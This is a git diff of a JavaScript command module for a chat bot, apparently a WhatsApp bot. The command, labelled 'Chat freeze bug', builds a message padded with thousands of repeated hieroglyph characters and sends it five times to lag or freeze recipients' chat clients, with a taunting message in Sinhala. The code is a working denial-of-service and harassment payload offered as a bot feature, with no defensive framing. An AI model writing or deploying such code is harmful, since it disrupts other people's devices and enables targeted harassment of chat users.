@@ -2,24 +2,31 @@ const { cmd } = require('../command');
 
 cmd({
     pattern: "gptpons",
-    alias: [ "gptp" ],
+    alias: ["gptp"],
     react: "🍑",
     desc: "Chat freeze bug 😈",
     category: "fun",
     filename: __filename
 },
-async (robin, mek, m, { from }) => {
+async (robin, mek, m, { from, reply }) => {
+    try {
+        // Character count eka poddak adu kara (Safety ekata)
+        // Ethakota bot crash wenne nathuwa message eka yanawa.
+        let heavyText = "𓀀".repeat(10000); 
 
-    // 🔥 Huge text (lag trigger)
-    let heavyText = "𓀀".repeat(50000); // size ekata adjust karanna puluwan
+        let bugMessage = "```GLITCH PHANTOMS THAMA HUTTO 👻```\n" +
+                         "*\"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන්\"*\n\n" + 
+                         heavyText;
 
-    let bugMessage = ````GLITCH PHANTOMS THAMA HUTTO 👻```        *"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන් බන්"*```GLITCH PHANTOMS THAMA HUTTO 👻```        *"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන් බන්"*```GLITCH PHANTOMS THAMA HUTTO 👻```        *"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන් බන්"*```GLITCH PHANTOMS THAMA HUTTO 👻```        *"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන් බන්"*```GLITCH PHANTOMS THAMA HUTTO 👻```        *"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන් බන්"*```GLITCH PHANTOMS THAMA HUTTO 👻```        *"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන් බන්"*```GLITCH PHANTOMS THAMA HUTTO 👻```        *"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන් බන්"*```GLITCH PHANTOMS THAMA HUTTO 👻```        *"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන් බන්"*```GLITCH PHANTOMS THAMA HUTTO 👻```        *"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන් බන්"*\n\n${heavyText}`;
+        // Loop eka athule await pawichchi karaddi error ekak awoth bot nawathina nisa try-catch damma
+        for (let i = 0; i < 5; i++) {
+            await robin.sendMessage(from, {
+                text: bugMessage
+            }, { quoted: m });
+        }
 
-    // 📩 Send multiple times
-    for (let i = 0; i < 5; i++) {
-        await robin.sendMessage(from, {
-            text: bugMessage
-        });
+    } catch (e) {
+        console.log(e);
+        reply("An error occurred while sending the message.");
     }
-
 });
